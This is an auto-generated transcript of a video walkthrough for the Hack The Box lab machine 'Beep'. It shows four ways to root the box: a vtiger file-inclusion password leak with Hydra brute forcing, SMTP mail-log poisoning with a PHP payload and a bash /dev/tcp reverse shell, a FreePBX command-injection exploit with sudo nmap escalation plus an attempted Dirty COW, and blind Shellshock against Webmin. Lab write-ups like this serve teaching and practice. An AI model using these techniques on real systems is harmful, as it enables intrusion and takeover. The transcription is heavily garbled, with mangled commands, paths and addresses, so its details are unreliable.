 hey guys what's going on this is it and we'll be doing beep from hack the box if you've done this machine before and are wondering why the videos so long it's because we're gonna be exploiting this box for different ways if you could enumerate the Box you could pop it because everywhere you looked there was a shell waiting the very first way is through a local file inclusion where you find the password that lets you log right and as root really simple that's how I did it the first time the second way we'll be doing some magic with that local file inclusion and getting code execution with it the third way will be through a free PBX exploit and the fourth way will be through shell shock on webmin so if you want to just go to a specific way I've put all the timestamps in the description below but if you want to see them all here we go and map is always the first thing we run so we're gonna do it with save scripts and numerate versions output all formats and then beeps IP which is ten ten ten seven looking at the output of this we do see quite a few ports are open the ones that we care about for this video are gonna be ssh on port 22 smtp on 25 which is mail apache HTTP listening on both 80 and 443 and webmin on port 10,000 another thing i'd recommend looking into but we won't in this video is my sequel I don't know if it's vulnerable on this box but my sequel is something you can often exploit maybe use it to drop files look at passwords etc not gonna look at this video just something to think about in the future since it's listening on a web port and web has such a big attack surface that's the place we start going to ten ten ten seven brings us this elastics home page elastics is a PBX appliance which just pulls a bunch of open source packages to build something we can do a do-it-yourself phone system the first thing I look at of course is software second thing is copyright information if I see this is like 2012 I know the software is probably out of date in this case it says 2017 and that's because elastics is running a date function so the copyright is always the year the application so no help there second thing I do is look at the page source I just pressed ctrl you and then glanced around to see if I see anything of interest that would say what version the application is in this case it is nothing so I'm going to turn to do a Buster and we're gonna type the URL so 10 10 10 7 and this is direct me to https so be sure to put that the skinny type wordlist I generally use is going to be user share wordless and then go Buster I normally use the directory list 2 3 medium but this would take quite a while because it's quite big I copy the entries I want out of that and put them into dirty cheetah so that's the word list I'm going to be using and I always disable this be recursive to checkbox because if I don't it's gonna make my skin take forever every directory it sees and runs that same list against it so if you have like 50,000 entries and you find one directory you never hit a hundred thousand URLs and it just crawls up really high really fast and dirt Buster will never finish so I always uncheck that and then run this and you can go to this results view and we'll see what we find slash configs slash admin both of those sound good so let's go to slash configs to see what we see default comp PHP probably won't get anything because the browser's gonna try to execute this we just get a blank page so we'll try going to admin next and get a login prompt just try like admin admin try a few defaults I never got in so I just hit cancel and then it brings me to a page eventually so we see an unauthorized thing but on this page we see free PBX two eight one four again all we're trying to do is get version information so this helps quite a bit search that with changelog and we get a bunch of entries from 2011 so chances are this free PBX is at least five years old which is good for us bad for the system another place I normally go is let's see if we have here slash help if you ever find help documents on a web server that is a amazing place because often times they may contain screenshots which have like file date creation now you could just pull out of well actually try that I just thought of that kind of as I was talking the main thing I look for is like backup instructions so I clicked on system and then back up here because it'll have screenshots and oftentimes backups are named in the date so scrolling down we see this document said hey the back was created in 2010 which means probably from 2010 but I would really want to check something real quick while I'm at it let's just go back to ten ten ten seven last six homepage I want to download this logo go save view image okay so if we go here W get this image let's save it it did not curl - Kade to ignore certificate checking and then we'll label this elastics dot PNG okay then we're gonna run exist tool on elastics and see what we see do we have any dates so creation this is when it entered my workstation so of course that's gonna be up to date but is there any metadata here that would say twenty eleven or twelve whenever no so we knew those green shots and that helped were from I went back sorry went on a tangent anyways the screenshots on that backup also said the software was relatively old so we know we're running elastics and it's an old copy so we're going to do search point against elastics and see what we see cross-site scripting we can generally ignore because these require users to exploit and in CTFs we don't have users but graph dot PHP local file inclusion let's check this out so search boy dash X and then that and we see the lfi is at V Tiger CRM and going back to order buster we do have V Tiger CRM and I did not disable the be recursive option when I ran this did I because we see it's hitting 581 URLs and if we do a word count on my list user share word list der Buster dirty cheetah there's only fourteen lines and we're requesting 592 files ninety-eight it's it's crazy it's actually larger than one this fraction does not work or make any sense but this is why I disable that be recursive option because things like this happen with toy buster but we know V Tiger serum is there so let's copy this and we'll see what happens and we get a bunch of garbage I'm gonna hit ctrl you to view the source and the reason why this looks much prettier than this is because this is rendering HTML and HTML needs that less than B or greater than B a thing to do line breaks it doesn't obey regular line breaks but we do view source it does so we see this config and pass was in the config so let's go and take everything we think can be a password and throw it into a text file so V P W and we got asterisk amp G password and that should be enough so the next thing is local file inclusions let you read any file that you have access to off that server so another good file if we're trying to do any type of brute force would be the passwd file to get a list of user names I want to do a SSH brute force so I want to grab every user that has a valid login so I'm gonna do the users paste this and just glancing through this I'm looking at this last field I see bash that's what I want I don't want this no login stuff so : G no login D is this going to lead them all yes it does so I don't want sync I don't want shut down I don't want home that's nothing and we get a list of users so I'm going to delete everything after that because I just want a list of users and then we can run Hydra so Hydra - H for help and then glancing over this it looks like capital L specifies a user list file capital P specifies a password list file and then Protocol IP so Hydra - L users - capital P my passwords SSH ten ten ten seven and then we let this run for a little bit and see if we get any hits and we should get a hit we did not why did we not I think this is the root password did I jump the gun and not copy the password and they just looked the same SSH connection reset by peer so it looks like it's blocking us so it may have like failed a ban or something no failed to be on would do IP table rule I'm actually not sure what just happened there so with this file inclusion one thing we can look at is Etsy Pam D passwords off is that it know about system off before doing brute forces is gently important to look at basic configurations to see if account walkouts or IP tables or there's something that blocks you so I'm looking for like Pam Talley which would lock accounts after X number of attempts and I don't see that so the other thing I can look into would be let's see Linux block SSH brute force so iptables rack aid go to this I'm just looking for like a file we can look for no see let's try this is aging again nope nope it's working there so I'm guessing yeah it has something that blocks us from brute-forcing that's sad so if we just go to this password list and delete a few entries and I chose this password because if we go back to this config that was the one we saw in most places now let's try to be fancy and do something but obviously there's something that blocks us after a time but we see this password is used for the NPDB database this one I had there but it was commented out this database is commented out so we're just gonna try that password against the root user and may have just wait a few minutes for us to be able to SSH again come on SSH huh there we go well again is that the password come on and there we go we get in as root and that is one way to pop the box wasn't as clean as I liked it let's see a less slash Etsy grep fail it does have failed a man so this would be something we should have looked at so seedy Etsy fill tube and let's see if we have permission to read this config fail to ban Kampf fail to ban to ban Kampf and this is why always you should always do proper enumeration on boxes so seeing this we can probably assume failed Oh ban is installed and off the top of my head I'm not sure where exactly everything is if we look at that log file doesn't exist weird it had to be failed to ban that block dust so that was the first way is just finding the root password and then I guess not using Hydra and getting lucky and this is what happens when you do videos eventually you find things you didn't realize the first time around and realize you just got lucky when you pop the box so yeah now let's do some magic and turn that lfi into an RFI since vtiger is a open source application you could download it if you're lazy you can just pop the box copy it to your local machine like I did I have it in the folder dot V tiger and the reason we do this is just to verify that alpha is capable of executing code because if it's not we could waste a lot of time when something is easy to verify or it could have something that we have to know to be able to exploit it and you'll understand once I get into this hopefully so going back to search boy we have the elephant V Tiger CRM graph dot PHP and the vulnerable variable is current language so let's let's graph dot PHP search for current language and look around so nothing there just setting a variable nothing running a function against current language and we don't have any sanitization so far because this request is taking it from the web browser and assigning it to current language and then directly throwing it into this custom function so let's see if this function exists anywhere I will send this it does not go to the top of the script and I can guess it's probably in one of these files that it's doing the require once against but for good measure I always just grab - capital and for that function we see it is and include utils utils PHP so go to include utils util dot PHP search for that function and we see it's assigning what we pass to it as the variable language so search for language now and go down and see what's going on so going through a log just setting setting language equal to language use and then we have right here we're including a file and language this variable was not sanitized anywhere above and we verified it wasn't sanitized we're pulling it from the browser so we're passing unsanitized content to this include function which makes it vulnerable the other thing I look at is where this variable is if it was at the very beginning of this we could use something called PHP filters and potentially get code execution that way or echo out the contents of PHP files because where this is we can't really view the source of any PHP files because it executes anything between there's PHP things so if I open this and V I can make it a bit more easy so V utils dot PHP include so yeah anything that is between that is going to get executed because it's include if that include was file underscore get underscore contents I believe then it would just literally get the constant file and never execute code so if language was right here and it was like language blank PHP then we could use PHP filters because in PHP you can do like PHP colon slash slash crap is it I think is colon slash slash filter slash I'm drawing a blank anyways Google around for PHP filter lfi you'll come to a page and will kind of explain it but there's a filter that can convert something to base64 and when you do that then you can actually view the source of these PHP files hopefully that makes sense if not my apologies I got all the buzzwords in so you can google around or maybe we'll come with the box that we actually use that and exploit and you understand then when you see it happening so all that was just to prove yes we got code execution because it is an include statement that was a key thing to take away there so the next step is to intercept on send another request through and we'll send it to repeater a few times so one two three four five and got five things in repeater all the same so the very first thing I want to do is see what user my web server is running as well my exploit can run as so we have to get Etsy passwd and this will tell us the users on the system in the user IDs and then the /proc sell status should tell us some more information so we see the name is httpd the pit parent pin user ID hundred group ID 101 so go back to this do 100 101 and we see we're running as the asterisk user and the directory is ver Lib asterisk so my very first thing is to go again take this lfi and search for ver Lib asterisk SSH slash ID RSA if we get the private key it's just an instant win and no private key so don't go there the next thing I do will be send this to intruder and see if there's any good spots that we can attack that was a horrible explanation watch and learn I guess so I'm going to clear all these and then just highlight the area I want to insert text which will be here and we can just label this because this doesn't really matter attack here again this can be anything all burps doing is going to go through a list a file and for every line input it between these weird s's so go to the payloads we're going to load and I have files and adopt fuzz I don't know why I got these from I'll try to find and put them in the flower description but I have a bunch of log files that I'm going to use intruder with and my very first line in this is Etsy passwd I it's not a log file but I put it there so I know my intruder worked it'll be obvious once we click start attack so we're gonna sort by length and we see Etsy passwd is the largest of the files and that's because it actually worked everything else is 232 and that's the size of the request saying it failed so I could let this run but I know I don't have access to read any log files because I've looked before and we did not so nothing there that is a dead end unfortunately but that is how you use intruder the next thing would be to go to a file called proc self and vayan so product self iron and if we have access to this file this may have variables that the web server has and one of those variables is like the user agent and if we have we can control the user agent so if we had access to this file we just change our user agent to like PHP echo hello and see we get code execution that way but again don't have access file so this doesn't work the next thing to do is inject yourself into PHP cookies and this one is one of the trickier aleph eyes and let's see probably be here we need to get PHP info first so let's go back into vtiger and we don't need to we could guess but because I'm showing how to do things i generally like seeing a PHP info so we'll grab PHP info on vtiger see if it exists anywhere here if not we'll log on the server Oh info modules [Music] maybe here so let's see if this exists canvas PDF dot PHP so let's go to burp disable that and know that does not get us anything so because we can execute code on the server let us go back to a repeater tab and throw this go no let's go back few directories and I'm just trying to find where this file is and if we get it then we'll see the PHP info page let's see let's just do this it's probably under WW HTML vtiger image canvas yeah right nope so it's not working there that that is odd let's just SH in the server cheat a bit I don't have the free PBX code but I think there's stuff there that we want so let's cut out the password to the server and ssh to it what so maybe it wasn't filled with BAM blocking me and someone else is on this server as I'm doing the video because I should not have been blocked by us SH there that that's on and kind of upsets me maybe Hydra would have worked I don't know there we go that is bizarre okay so we're gonna go to www.hsn we'll just grep for PHP info and see what exists this server is going slow this could be a dead end well I know the session is if you get access to PHP info it tells you where the session is and that's why having PHP info is nice but session is gonna be under slash temp /s ESS underscore the PHP session see nope let's try the elastic session maybe this exists nope some session should exist maybe I have to create a cookie let's go to like slash admin and get a cookie from here maybe free PBX is better with setting cookies reports core tanks I'm just trying to click and have the application set my cookie so it exists on the server so let's test test remember okay so let's see if this one works intercept dawn refresh see does this exist now this is getting really annoying go back to the server LS / town that's where the cookies are that's where that's why I have HK 8-3 I am for GFI ke5 I'm not sure why it's not reading that is that just an empty file oh sorry about this this video is not going as smoothly as my normal ones but yeah empty file that's why it didn't put anything in the cookie okay well that's a dead end as well and you can see how frustrating it can be to turn LF eyes into horrifies there's a lot of the good ways the other thing is this server was listening over SMTP so let's tone it to that port so telnet ten ten ten seven and then we wait for the 25 SMTP response and there's probably programs out there just to send mail to a server but it's easy enough to just do it through telnet so here we go we have the server responding with the enhanced SMTP postfix so I'm gonna send enhanced how well and identify Who I am so I'm gonna say I'm upset dot B PhD B this doesn't really matter you just have to have something there and the server's gonna respond was a bunch of things so I want to know I want to do a verify command to verify that risk at localhost as a valid user and it says yes it is so if I verify some type of junk it says nope that user doesn't exist so we know asterisk is a local user so the next step will be to do mail from and we'll say pwned at ha ha I oh that doesn't matter and then recipient to asterisk at localhost and then data is the next thing we type and we can begin our email so subject you've got owned and then the contents of this email will just be PHP echo system request I do that correctly no I want that looks better yep that looks good yeah so then you do a blank line and end the email with a dot and I really hope i type that correctly it says okay mail has been queued so we can exit telnet and see if we can execute code so go back to repeater the LF I should be and I think mail asterisk and we should have it so we see this email it's from parent haha I oh we don't see any text here but that's probably because it's not executing anything so if we just do it equals the way I'm line oh no we got to do and it equals Who am I and we see we got code execution awesome so the next step would be I'm just going to convert this into a post request so URL encoding doesn't screw me as hard as it normally does and we can try a shell so bash - I that /dev TCP ten ten fifteen my 135 yeah 135 135 will send the shell over leet zero and one okay and then highlight this URL encode it with control you and NCL vnp leet and then click go and we get a shell so unlike the last shell though we are only running as asterisk if we went back to that search point thing let's see - X does this have no so if we do search boy elastics I think and then look at this Python one which will be the next way we prove ask but I'm just gonna steal the method we know the next way we get a shell will be this script but I'm just gonna steal the probe ask in this so search poit - X so down here we see hey asterisk gently allows you to run sudo uh and map as interactive and when n map is interactive you can do a bang and execute commands so let's try that sudo - l2 list what commands I can run under sudo and I do see an map is there so if I do sudo and map - - interactive I get the end map interactive prompt and I can just do bang SH and then type ID and I am route so there's the second way to pop the box hopefully you follow that and everything made sense if not my apologies and yeah let's I guess move on to the third way to poem beep which is through that a commenter the last exploit we looked at install the professed portion of so let's do search boy on elastics and do search boy - X on this Python script so let's kind of see what it is this code I don't know exactly what it is so let's go burp decoder paste it in and do a smart decode and we can see I get an idea what it is so looks like just straight command injection right here the Pearl and it's using some type of pearl socket so the main thing I look for is I don't think this code will blow up my server because you should never run untrusted code on something always nice to have kind of idea what's going on so looks like we need our host l host l port so these are a box extension so we need a valid extension for this or it's not going to work we can try one thousand and hope for the best but our host and this so let's do search boy I think it's let's just do ask - hoi can Ram the flag - P is what I want that's why I thought so - P copied the path of that exploit to my clipboard and now I can copy to my directory and we can edit it so our host we want 10-10-10 7l host was 10 10 10 was it 153 I have config 135 there we go l port yeah I can listen on 4 for 3 extension fine so if this exploit works we should get a show that easily so NC l VN p 4 4 3 and then we're going to run that exploit thinking thinking come on run we get a weird SSL error and it's just because the certificate failed to verify and instead of trying to modify this Python to get the cert working because I don't know off the top my head with the command is I'm going to use burp to help me so let me change this to HTTP and point this to my local host and then in burp I'm going to go over to the proxy options tab add a new listener and a bind to port 80 and go to a request handling redirect everything to ten ten ten seven and redirect I just click forced use of SSL and 443 so now my local host on port 80 is going to transparently afford me over to the beep server and I don't have to deal with SSL now so I can just run Python beep and we'll see if I get my shell it's taking a while to run come on come on come on that SLE check is taking a while not sure what's going on so command ran and did not get anything so I can intercept on run this again send this to repeater so we have it and we'll see if it gets a response because the script didn't print out a response because the script is horrible so let's see the call failed perhaps the line was busy so maybe we should start looking around and figuring out what a valid extension would be so cancel out the script we can use a tool called sip vicious there are two ways I'm going to do this the first will be sip fish it's a like were dialing tool so we can do s-sit vicious map as we map and then the IP address to make sure I guess it's a PBX and we do see the SIP device and user agent and it's using port 5060 so not four four four or five which I may have mentioned the beginning the video not true so I really don't know what that port is after we prove ask I guess we can look at what it's doing SV war is the word dialling portion of SIP vicious and it's got a lot of flags I think I remember um so sip vicious war extension and then IP so SP war extensions going to be let's just do a hundred to three hundred and then the IP and we can set a force but this isn't going to work we have to change the method we're using so this is kind of like how you want to do TCP scans and and map like do you want to do a sense can a full TCP scan things like that so we're gonna change the method and as we war to invite and to speed this up I'm just going to do fifty extensions and it's saying extension 236 probably exists so 236 was weird 233 is probably a valid extension we can run that again narrow this down to see if we get that weird response again and they take note warning whenever you do like sip tools and things you may cause phones during so most likely the extension is 233 if you had poked around the application more you may have went to slash panel and that was in that do buster thing we did earlier and slash panel is a flash application and it tells you the extension so I know of two ways to easily get an extension of a valid user you could also just brute force this exploit so let's see we can change the extension here a thousand is what we had we can change this to thirty three and then send the request again and did we get anything here on panel no intercepts on that's why come on panel respond my book respond yes so instead of saying it's busy we have it's saying click here to hang up so if we go back into terminal go to a net cat session and we got a lot of weird gibberish do we have a shell we do not have a shell okay let's not do that to Boop let's do this through the script this is a lot of weird stuff happening I don't know what's going on 233 was the extension I think Python beep makes my burp is not on intercept and run couldn't connect a beat did my beep reboot did something happen ok now beep is connected maybe someone reset it slash panel and reduce the extension there but my Python script ran didn't get a response let's run this again I think the server went down for a reboot that's going awry fast what the hell was going on now localhost 10-10-10 35 135 we we have to be 135 because we got a response yeah 10 10 15 135 10 10 I don't know what actually hit me on 4 4 3 now oh I think I know no I was thinking maybe my burp was listening on 4 for 3 but no it's not I don't know what's going on but I had my IP wrong in this script so if we wanted to go to burp and go to the repeater fine way it says that tens so we can just search for 10 10 10 it's 10:00 10:15 10 10 10 10 is one of my old ip's 10 10 15 isn't what I get now so now if I go to a shell and run this should get a shell there we go awesome turns out when you fat-finger an IP you can screw yourself over pretty good so we can see I'm wearing under the asterisk user so I'm going to do Python Darcy employ PT y PT y dot spawn then bash to get a kind of terminal to tab just work now so I don't have tab auto-completion and I really like tab auto-completion so press ctrl-z to background stty raw - echo and then foreground and I just did this inside of T MUX did I kill everything no team buck still works sweet so you can do that method in team ox I think I said I didn't do it in one of my previous videos turns out you can so now I have my tab order completion and I'm a happy camper so we're not gonna do that pseudo exploit I'm gonna try to dirty calvess box because well the kernel is from 2011 so it should be vulnerable let's see I actually haven't dirty Kalp this so this will be a learning experience I've used them for it just not against this box so Google dirty Cal let's copy view exploit and the reason I'm not doing search poit is because feh CentOS if you do proc self mem it's not gonna work you need to use one of the PJs polka data ones for CentOS see this is the safest one but it's based upon the content hourly so we don't want to do that let's just do this one on passwd so go to raw copy this V Cousy set paste paste this in that's correct Oh doesn't take a second so go to the top and read these instructions to get compiled instructions GCC okay dirty dot C so can't open file for writing w / tap Callebaut see there we go I don't know what directory I went in but I don't have write access there I'm in slash so go to town and I have cow it out see there so paste this get rid of dirty but cow and then chmod seven seven seven just make this execute I could just done plus X to be safe but hey this provides you route anyways so why care Etsy password was backed up and a password let's just do password is password and then it becomes a waiting game so I'm probably gonna wait 15-20 seconds and then hope that they exploit finished and the box didn't crash because if the exploit doesn't finish or the box crashes what a walk and that's why dirty cow isn't normally the first go you should do for prevx but since we already did it one up another way doing it this way and if it crashes it crashes so see so Z background this lets do su fire front is the username it wrote doesn't exist so it doesn't look like this box worked with dirty cow I think it's going too slow for this race condition to actually happen or something weird is going on but it should be vulnerable it should be vulnerable so I guess I shouldn't actually do testing before I do these videos all the time and make sure everything works fine because if I don't then this happens let's see that's WD is what it writes to yeah so some type of configurations make this not vulnerable or it's just going too slow for dirty cow to work and a timely fashion so sudo and map - - interactive and then bang Sh ID we are root huzzah there you go so two ways we've done three ways to get a low privilege no three shells one shell was instant route to a low probe and we use the same method to escalate both times so okay well on to I guess the final exploit which will be the shell shock on webmin this is going too long I'm losing train of thought very quickly so there's would be a quick one I hope if not then my apologies because I'm not gonna make sense so HTTP ten ten ten seven web men listened on port 10,000 proxy interceptors off awesome and just in case is not HTTP and HTTP will hit that as well and this box okay it is an SSL mode and I think because I have dirty cow it's going incredibly slow maybe that's what other people are doing in the box and that's why it's having issues note self or note to you guys dirty cow not a safe exploit to run I bet that's it people see candles from old and then jump straight to dirty cow and weird things happen yeah that shot was done let's see give me a she'll be killed - 9 cow died cat at sea bass WD yeah it didn't work but ok that's we got a webmin port so this is what we want web men let's intercept this request and if you did look on web men you'd see it uses a lot of cgi files and cgi files are generally vulnerable to shell shock I think that's the reason if not that's the reason we'll go with it so Center Peter hit it a few times and we're looking at the response times I get like one second back yeah 1.2 milliseconds so user agent let's change it to shell shock so open close parenthesis squiggly that and then we should be able to just do bin echo hello normally this would be enough to get shell shocked to work and if it did then your and Matt probably were told you a shell shockable but for some reason when you do it this way the web server that Wedman is using isn't giving the output if this was a patchy shell shock you would have seen how well but you don't so I don't know we're gonna do kind of a blind method and just insert a sleep command for sleep 10 and it's gonna sleep for 10 seconds and if it takes longer than 1 to 2 seconds to respond chances are it is vulnerable so do this once and just waiting 11 seconds to respond do it again and if I can get another 11 seconds to respond we'll turn to sleep down to 1 and then it will take much less than 11 seconds to respond probably to because the normal stuff was responding within 1 to 2 plus 1 so B 2 to 3 so 12 seconds their turn sleep to 1 and we're going to get 3 seconds so it's kind of a blind way to see you do have code execution so the next step opened a new tab and cat because we're going to listen well I guess 80 81 and no in the same command I did for my last over shell so bash - I that dev TCP 10 10 15 135 not 1080 8101 go and then come here and we get a shell so that shell shock and the reason I guess most people didn't see that is because you have to use blind injection to work with it but instant root once you exploit it and that will be the video oh my god this went a long time hopefully it was good hopefully you learn something I know I did take care have a good night and maybe I'll do another video between next week I want to do Valen just have a head time so I wanted to see you next week for hack in the box or maybe sooner for Vaughn hub